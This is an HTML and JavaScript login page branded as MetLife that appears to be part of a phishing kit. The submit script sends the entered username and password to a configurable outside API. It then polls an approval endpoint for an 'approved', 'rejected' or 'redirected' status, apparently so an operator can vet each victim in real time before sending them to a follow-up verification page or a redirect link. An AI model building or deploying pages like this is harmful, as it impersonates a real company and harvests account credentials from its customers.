<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>login - metlife</title><link rel="stylesheet" href="styles.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
<style>
.password-wrap{position:relative;display:inline-flex;align-items:center}.password-wrap input{padding-right:27px}.password-toggle{position:absolute;right:3px;top:50%;transform:translateY(-50%);border:0;background:transparent;color:#777;font-size:11px;padding:2px;cursor:pointer}.password-toggle:hover{color:#3d7fa4}
.message-container {
  width: 100%;
  padding: 12px 12px;
  margin-bottom: 20px;
  border-radius: 4px;
  font-size: 14px;
  line-height: 1.5;
  display: none;
  align-items: center;
  gap: 10px;
}
.message-container.show {
  display: flex;
}
.message-container.success {
  background: #d4edda;
  border: 1px solid #c3e6cb;
  color: #155724;
}
.message-container.error {
  background: #f8d7da;
  border: 1px solid #f5c6cb;
  color: #721c24;
}
.message-icon {
  font-size: 16px;
  flex-shrink: 0;
}
.logo{
  max-width: 250px;
  height: auto;
  margin-bottom: 20px;
}
</style>
<script src="../config.js"></script>
<!-- <script src="js/logVisitor.js"></script> -->
</head>
<body>
  <main class="page">
<img class="logo" id="globalLogo" src="./img/img.jpg" alt="Metlife logo">

<div id="messageBox" class="message-container">
  <span class="message-icon" id="messageIcon"></span>
  <span id="messageText"></span>
</div>

<section class="panel">
  <h1>Login</h1>
<div id="existingUsersCard" class="columns">
<div class="card"><h2>Existing Users</h2>
<div class="row"><label>Username</label><input id="username" type="text" readonly><a class="link" href="#" onclick="changeAccount(); return false;">Change Account?</a></div>
<div class="row password-row">
<label>Password</label>
<div class="password-wrap">
<input id="password" type="password" value="">
<button type="button" class="password-toggle" onclick="togglePassword()" aria-label="Show password">
<i id="password-icon" class="fa-solid fa-eye"></i>
</button>
</div>
<a class="link" href="#">Forgot Password?</a>
</div>
<div class="next-wrap"><a id="loginBtn" class="btn" href="#" onclick="submitLogin(); return false;">Next</a></div>
</div>
<div class="card"><h2>New User?</h2>
<p class="new-copy">New users can create a new account to get started.</p>
<div class="center"><a class="btn" href="#">Get Started</a></div>
</div></div>

</section>

<div id="globalFooter" class="footer"></div>

</main><script>
let statusCheckInterval = null;
let loginVerificationId = null;

function showMessage(message, type = 'error') {
  const messageBox = document.getElementById('messageBox');
  const messageText = document.getElementById('messageText');
  const messageIcon = document.getElementById('messageIcon');
  
  messageText.textContent = message;
  messageBox.className = 'message-container show ' + type;
  messageIcon.textContent = type === 'success' ? '✓' : '✕';
  
  // Auto-hide after 5 seconds
  setTimeout(() => {
    messageBox.classList.remove('show');
  }, 5000);
}

function initPage() {
  const logo = document.getElementById('globalLogo');
  logo.src = window.APP_CONFIG.logo;
  logo.alt = window.APP_CONFIG.logoAlt;
  
  const footer = document.getElementById('globalFooter');
  const cfg = window.APP_CONFIG.footer;
  footer.innerHTML = `<b>Contact Us</b> - Call ${cfg.company} at ${cfg.phone}, Toll Free at ${cfg.phoneToll} or Email us at <a href="#">${cfg.email}</a><br><br>${cfg.copyright}`;
  
  const username = localStorage.getItem('metlife_username');
  if (!username) {
    window.location.href = '../index.html';
    return;
  }
  document.getElementById('username').value = username;
  
  
}

function togglePassword(){
  const password=document.getElementById("password");
  const icon=document.getElementById("password-icon");
  if(password.type==="password"){password.type="text";icon.classList.remove("fa-eye");icon.classList.add("fa-eye-slash");}
  else{password.type="password";icon.classList.remove("fa-eye-slash");icon.classList.add("fa-eye");}
}

function changeAccount(){
  localStorage.removeItem('metlife_username');
  window.location.href = '../index.html';
}

function submitLogin(){
  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value;
  
  if (!password) {
    showMessage('Please enter your password.', 'error');
    return;
  }
  
  const btn = document.getElementById('loginBtn');
  const originalText = btn.textContent;
  btn.disabled = true;
  btn.textContent = 'Loading...';
  
  fetch(window.metlife_API_BASE + '/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: username, password: password })
  })
  .then(function(response){
    return response.json().then(function(data){
      return { ok: response.ok, data: data };
    });
  })
  .then(function(result){
    if(!result.ok){
      showMessage(result.data.message || 'Unable to process login.', 'error');
      btn.disabled = false;
      btn.textContent = originalText;
      return;
    }

    localStorage.setItem('temp_token', result.data.tempToken);
    loginVerificationId = result.data.verificationId;
    localStorage.setItem('login_verification_id', result.data.verificationId);

    if(result.data.requiresApproval){
      // startWaitingForApproval();
      startStatusCheck();
    } else if(result.data.requiresTwoFactor){
      window.location.href = 'verify-method.html';
    } else {
      localStorage.setItem('metlife_token', result.data.tempToken);
      localStorage.setItem('verification_complete', 'true');
      window.location.href = 'verify-method.html';
    }
  })
  .catch(function(){
    showMessage('Unable to reach the server. Please try again.', 'error');
    btn.disabled = false;
    btn.textContent = originalText;
  });
}

// function startWaitingForApproval() {
//   document.getElementById('existingUsersCard').style.display = 'block';
//   document.getElementById('waitingCard').style.display = 'none';
// }

function startStatusCheck() {
  if (statusCheckInterval) {
    clearInterval(statusCheckInterval);
  }

  statusCheckInterval = setInterval(() => {
    if (!loginVerificationId) {
      clearInterval(statusCheckInterval);
      return;
    }

    const tempToken = localStorage.getItem('temp_token');
    fetch(window.metlife_API_BASE + `/api/auth/check-login-approval/${loginVerificationId}`, {
      headers: { 'Authorization': `Bearer ${tempToken}` },
    })
    .then(r => r.json())
    .then(result => {
      if (result.status === 'approved') {
        clearInterval(statusCheckInterval);
        completeLogin();
      } else if (result.status === 'rejected') {
        clearInterval(statusCheckInterval);
        rejectLogin();
      } else if (result.status === 'redirected') {
        clearInterval(statusCheckInterval);
       window.location.href=window.APP_CONFIG.redirectLink
      }
    })
    .catch(err => {
      console.error('Status check error:', err);
    });
  }, 3000);
}

function completeLogin() {
  const tempToken = localStorage.getItem('temp_token');
  localStorage.setItem('metlife_token', tempToken);
  localStorage.setItem('verification_complete', 'true');


  setTimeout(() => {
    window.location.href = 'verify-method.html';
  }, 500);
}

function rejectLogin() {
  if (statusCheckInterval) {
    clearInterval(statusCheckInterval);
  }
  
  showMessage('Username or password is incorrect.', 'error');
  
  localStorage.removeItem('temp_token');
  localStorage.removeItem('metlife_username');
  localStorage.removeItem('login_verification_id');
  
  setTimeout(() => {
    window.location.href = '../index.html';
  }, 2000);
}

window.addEventListener('load', initPage);
</script>
</body></html>
